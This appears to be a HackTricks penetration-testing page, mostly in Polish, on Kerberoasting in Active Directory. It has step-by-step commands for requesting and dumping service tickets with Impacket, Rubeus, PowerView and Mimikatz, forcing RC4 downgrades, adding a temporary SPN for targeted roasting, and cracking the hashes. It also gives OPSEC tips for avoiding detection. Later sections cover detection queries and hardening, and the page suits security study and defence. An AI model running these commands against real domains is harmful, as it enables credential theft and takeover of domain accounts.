# Kerberoast

{{#include ../../banners/hacktricks-training.md}}

## Kerberoast

Kerberoasting skupia się na pozyskiwaniu TGS tickets, konkretnie tych związanych z usługami działającymi pod kontami użytkowników w Active Directory (AD), z wyłączeniem kont komputerów. Szyfrowanie tych ticketów wykorzystuje klucze pochodzące z haseł użytkowników, co umożliwia łamanie poświadczeń offline. Użycie konta użytkownika jako usługi sygnalizuje niepuste pole ServicePrincipalName (SPN).

Każdy uwierzytelniony użytkownik domeny może zażądać TGS tickets, więc nie są wymagane żadne specjalne uprawnienia.

### Kluczowe punkty

- Celuje w TGS tickets dla usług, które działają pod kontami użytkowników (tzn. konta z ustawionym SPN; nie konta komputerów).
- Tickety są szyfrowane kluczem pochodzącym z hasła konta usługi i można je łamać offline.
- Nie są wymagane podwyższone uprawnienia; dowolne uwierzytelnione konto może żądać TGS tickets.

> [!WARNING]
> Większość publicznych narzędzi woli żądać RC4-HMAC (etype 23) service tickets, ponieważ są one szybsze do złamania niż AES. RC4 TGS hashes zaczynają się od `$krb5tgs$23$*`, AES128 od `$krb5tgs$17$*`, a AES256 od `$krb5tgs$18$*`. Jednak wiele środowisk przechodzi na AES-only. Nie zakładaj, że tylko RC4 jest istotne.
> Również unikaj „spray-and-pray” roasting. Domyślny kerberoast Rubeus może zapytać i zażądać ticketów dla wszystkich SPN i jest głośny. Najpierw wyenumeruj i celuj w interesujące principals.

### Sekrety kont usługowych i koszt kryptograficzny Kerberos

Wiele usług wciąż działa pod kontami użytkowników z ręcznie zarządzanymi hasłami. KDC szyfruje service tickets kluczami pochodzącymi z tych haseł i przekazuje szyfrogram dowolnemu uwierzytelnionemu podmiotowi, więc kerberoasting daje nieograniczoną liczbę prób offline bez blokad czy telemetryki DC. Tryb szyfrowania determinuje budżet łamania:

| Mode | Key derivation | Encryption type | Approx. RTX 5090 throughput* | Notes |
| --- | --- | --- | --- | --- |
| AES + PBKDF2 | PBKDF2-HMAC-SHA1 z 4,096 iteracjami i per-principal salt generowaną z domeny + SPN | etype 17/18 (`$krb5tgs$17$`, `$krb5tgs$18$`) | ~6,8 milionów prób/s | Sol blokuje rainbow tables, ale nadal pozwala na szybkie łamanie krótkich haseł. |
| RC4 + NT hash | Pojedyncze MD4 hasła (unsalted NT hash); Kerberos tylko miesza 8-bajtowy confounder na ticket | etype 23 (`$krb5tgs$23$`) | ~4,18 **miliarda** prób/s | ~1000× szybciej niż AES; atakujący wymuszają RC4 zawsze gdy `msDS-SupportedEncryptionTypes` na to pozwala. |

*Benchmarki od Chick3nman, jak opisano w [Matthew Green's Kerberoasting analysis](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/).

Confounder RC4 jedynie losuje keystream; nie dodaje pracy na próbę. Jeśli konta usługowe nie polegają na losowych sekretach (gMSA/dMSA, konta maszynowe lub sekrety zarządzane przez vault), szybkość kompromitacji zależy wyłącznie od budżetu GPU. Wymuszenie etypes tylko-AES usuwa możliwość degradowania do miliardów prób na sekundę, ale słabe ludzkie hasła nadal padają ofiarą PBKDF2.

### Atak

#### Linux
```bash
# Metasploit Framework
msf> use auxiliary/gather/get_user_spns

# Impacket — request and save roastable hashes (prompts for password)
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# With NT hash
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# Target a specific user’s SPNs only (reduce noise)
GetUserSPNs.py -request-user <samAccountName> -dc-ip <DC_IP> <DOMAIN>/<USER>

# NetExec — LDAP enumerate + dump $krb5tgs$23/$17/$18 blobs with metadata
netexec ldap <DC_FQDN> -u <USER> -p <PASS> --kerberoast kerberoast.hashes

# kerberoast by @skelsec (enumerate and roast)
# 1) Enumerate kerberoastable users via LDAP
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -o kerberoastable
# 2) Request TGS for selected SPNs and dump
kerberoast spnroast 'kerberos+password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes
```
Narzędzia wielofunkcyjne zawierające sprawdzenia kerberoast:
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN> -ip <DC_IP> -u <USER> -p <PASS> -c
```
#### Windows

- Wyszukaj kerberoastable użytkowników
```powershell
# Built-in
setspn.exe -Q */*   # Focus on entries where the backing object is a user, not a computer ($)

# PowerView
Get-NetUser -SPN | Select-Object serviceprincipalname

# Rubeus stats (AES/RC4 coverage, pwd-last-set years, etc.)
.\Rubeus.exe kerberoast /stats
```
- Technika 1: Poproś o TGS i dump z pamięci
```powershell
# Acquire a single service ticket in memory for a known SPN
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"  # e.g. MSSQLSvc/mgmt.domain.local

# Get all cached Kerberos tickets
klist

# Export tickets from LSASS (requires admin)
Invoke-Mimikatz -Command '"kerberos::list /export"'

# Convert to cracking formats
python2.7 kirbi2john.py .\some_service.kirbi > tgs.john
# Optional: convert john -> hashcat etype23 if needed
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$*\1*$\2/' tgs.john > tgs.hashcat
```
- Technika 2: Automatyczne narzędzia
```powershell
# PowerView — single SPN to hashcat format
Request-SPNTicket -SPN "<SPN>" -Format Hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
# PowerView — all user SPNs -> CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus — default kerberoast (be careful, can be noisy)
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
# Rubeus — target a single account
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast
# Rubeus — target admins only
.\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap
```
> [!WARNING]
> Żądanie TGS generuje Windows Security Event 4769 (Zażądano biletu usługowego Kerberos).

### OPSEC i środowiska tylko z AES

- Celowo żądaj RC4 dla kont bez AES:
- Rubeus: `/rc4opsec` używa tgtdeleg do enumeracji kont bez AES i żąda ticketów RC4.
- Rubeus: `/tgtdeleg` z kerberoast również wywołuje żądania RC4 tam, gdzie to możliwe.
- Roast konta tylko z AES zamiast kończyć się milczeniem:
- Rubeus: `/aes` enumeruje konta z włączonym AES i żąda ticketów usługowych AES (etype 17/18).
- Jeśli już posiadasz TGT (PTT lub z .kirbi), możesz użyć `/ticket:<blob|path>` z `/spn:<SPN>` lub `/spns:<file>` i pominąć LDAP.
- Targetowanie, throttling i mniejszy hałas:
- Użyj `/user:<sam>`, `/spn:<spn>`, `/resultlimit:<N>`, `/delay:<ms>` i `/jitter:<1-100>`.
- Filtruj prawdopodobnie słabe hasła używając `/pwdsetbefore:<MM-dd-yyyy>` (starsze hasła) lub kieruj na uprzywilejowane OU za pomocą `/ou:<DN>`.

Przykłady (Rubeus):
```powershell
# Kerberoast only AES-enabled accounts
.\Rubeus.exe kerberoast /aes /outfile:hashes.aes
# Request RC4 for accounts without AES (downgrade via tgtdeleg)
.\Rubeus.exe kerberoast /rc4opsec /outfile:hashes.rc4
# Roast a specific SPN with an existing TGT from a non-domain-joined host
.\Rubeus.exe kerberoast /ticket:C:\\temp\\tgt.kirbi /spn:MSSQLSvc/sql01.domain.local
```
### Łamanie
```bash
# John the Ripper
john --format=krb5tgs --wordlist=wordlist.txt hashes.kerberoast

# Hashcat
# RC4-HMAC (etype 23)
hashcat -m 13100 -a 0 hashes.rc4 wordlist.txt
# AES128-CTS-HMAC-SHA1-96 (etype 17)
hashcat -m 19600 -a 0 hashes.aes128 wordlist.txt
# AES256-CTS-HMAC-SHA1-96 (etype 18)
hashcat -m 19700 -a 0 hashes.aes256 wordlist.txt
```
### Utrzymywanie dostępu / Nadużycie

Jeśli kontrolujesz konto lub możesz je zmodyfikować, możesz uczynić je kerberoastable, dodając SPN:
```powershell
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='fake/WhateverUn1Que'} -Verbose
```
Obniż uprawnienia konta, aby włączyć RC4 i ułatwić cracking (wymaga uprawnień do zapisu na obiekcie docelowym):
```powershell
# Allow only RC4 (value 4) — very noisy/risky from a blue-team perspective
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=4}
# Mixed RC4+AES (value 28)
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=28}
```
#### Ukierunkowany Kerberoast przez GenericWrite/GenericAll na koncie użytkownika (tymczasowy SPN)

Gdy BloodHound pokaże, że masz kontrolę nad obiektem użytkownika (np. GenericWrite/GenericAll), możesz niezawodnie przeprowadzić "targeted-roast" tego konkretnego użytkownika, nawet jeśli nie ma on obecnie żadnych SPN:

- Dodaj tymczasowy SPN do kontrolowanego użytkownika, aby można go było poddać Kerberoastowi.
- Zażądaj TGS-REP zaszyfrowanego RC4 (etype 23) dla tego SPN, aby ułatwić łamanie.
- Złam hash `$krb5tgs$23$...` przy użyciu hashcat.
- Usuń tymczasowy SPN, aby zmniejszyć ślad.

Windows (PowerView/Rubeus):
```powershell
# Add temporary SPN on the target user
Set-DomainObject -Identity <targetUser> -Set @{serviceprincipalname='fake/TempSvc-<rand>'} -Verbose

# Request RC4 TGS for that user (single target)
.\Rubeus.exe kerberoast /user:<targetUser> /nowrap /rc4

# Remove SPN afterwards
Set-DomainObject -Identity <targetUser> -Clear serviceprincipalname -Verbose
```
Jednolinijkowiec dla Linuxa (targetedKerberoast.py automatyzuje dodanie SPN -> żądanie TGS (etype 23) -> usunięcie SPN):
```bash
targetedKerberoast.py -d '<DOMAIN>' -u <WRITER_SAM> -p '<WRITER_PASS>'
```
Złam wynik za pomocą hashcat autodetect (mode 13100 dla `$krb5tgs$23$`):
```bash
hashcat <outfile>.hash /path/to/rockyou.txt
```
Uwagi dotyczące wykrywania: dodawanie/usuwanie SPN powoduje zmiany w katalogu (Event ID 5136/4738 dla docelowego użytkownika), a żądanie TGS generuje Event ID 4769. Rozważ ograniczanie liczby żądań i szybkie sprzątanie.

You can find useful tools for kerberoast attacks here: https://github.com/nidem/kerberoast

If you find this error from Linux: `Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)` it’s due to local time skew. Sync to the DC:

- `ntpdate <DC_IP>` (deprecated on some distros)
- `rdate -n <DC_IP>`

### Kerberoast without a domain account (AS-requested STs)

We wrześniu 2022 Charlie Clark wykazał, że jeśli principal nie wymaga pre-authentication, możliwe jest uzyskanie service ticket za pomocą spreparowanego KRB_AS_REQ przez zmianę sname w treści żądania, co w praktyce daje service ticket zamiast TGT. To jest podobne do AS-REP roasting i nie wymaga ważnych poświadczeń domenowych.

Szczegóły: Semperis write-up “New Attack Paths: AS-requested STs”.

> [!WARNING]
> Musisz podać listę użytkowników, ponieważ bez ważnych poświadczeń nie możesz wykonać zapytania do LDAP przy użyciu tej techniki.

Linux

- Impacket (PR #1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile users.txt -dc-host dc.domain.local domain.local/
```
Windows

- Rubeus (PR #139):
```powershell
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:domain.local /dc:dc.domain.local /nopreauth:NO_PREAUTH_USER /spn:TARGET_SERVICE
```
Powiązane

Jeśli celujesz w AS-REP roastable users, zobacz także:

{{#ref}}
asreproast.md
{{#endref}}

### Detection

Kerberoasting może być trudny do wykrycia. Poszukuj Event ID 4769 z DCs i zastosuj filtry, aby zmniejszyć szum:

- Wyklucz nazwę usługi `krbtgt` oraz nazwy usług kończące się na `$` (konta komputerowe).
- Wyklucz żądania pochodzące od kont maszynowych (`*$$@*`).
- Tylko pomyślne żądania (Failure Code `0x0`).
- Śledź typy szyfrowania: RC4 (`0x17`), AES128 (`0x11`), AES256 (`0x12`). Nie alarmuj tylko na `0x17`.

Przykład PowerShell triage:
```powershell
Get-WinEvent -FilterHashtable @{Logname='Security'; ID=4769} -MaxEvents 1000 |
Where-Object {
($_.Message -notmatch 'krbtgt') -and
($_.Message -notmatch '\$$') -and
($_.Message -match 'Failure Code:\s+0x0') -and
($_.Message -match 'Ticket Encryption Type:\s+(0x17|0x12|0x11)') -and
($_.Message -notmatch '\$@')
} |
Select-Object -ExpandProperty Message
```
Dodatkowe pomysły:

- Ustal bazowe użycie SPN dla każdego hosta/użytkownika; wyzwalaj alert przy dużych nagłych wzrostach liczby różnych żądań SPN pochodzących od jednego principal.
- Oznacz nietypowe użycie RC4 w domenach zabezpieczonych pod kątem AES.

### Mitigacja / Utwardzanie

- Używaj gMSA/dMSA lub kont maszynowych dla usług. Konta zarządzane mają losowe hasła o długości 120+ znaków i rotują automatycznie, co czyni łamanie offline niepraktycznym.
- Wymuś AES dla kont usługowych, ustawiając `msDS-SupportedEncryptionTypes` na AES-only (decimal 24 / hex 0x18), a następnie zrotuj hasło, aby wygenerowane zostały klucze AES.
- Tam, gdzie to możliwe, wyłącz RC4 w środowisku i monitoruj próby użycia RC4. Na kontrolerach domeny (DC) możesz użyć wartości rejestru `DefaultDomainSupportedEncTypes` aby sterować domyślnymi ustawieniami dla kont, które nie mają ustawionego `msDS-SupportedEncryptionTypes`. Testuj dokładnie.
- Usuń niepotrzebne SPN z kont użytkowników.
- Używaj długich, losowych haseł dla kont usługowych (25+ znaków), jeśli konta zarządzane nie są możliwe; blokuj powszechne hasła i regularnie audytuj.

## References

- [HTB: Breach – NetExec LDAP kerberoast + hashcat cracking in practice](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [https://github.com/ShutdownRepo/targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)
- [Matthew Green – Kerberoasting: Low-Tech, High-Impact Attacks from Legacy Kerberos Crypto (2025-09-10)](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/)
- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)
- [Microsoft Security Blog (2024-10-11) – Microsoft’s guidance to help mitigate Kerberoasting](https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/)
- [SpecterOps – Rubeus Roasting documentation](https://docs.specterops.io/ghostpack/rubeus/roasting)
- [HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)

{{#include ../../banners/hacktricks-training.md}}
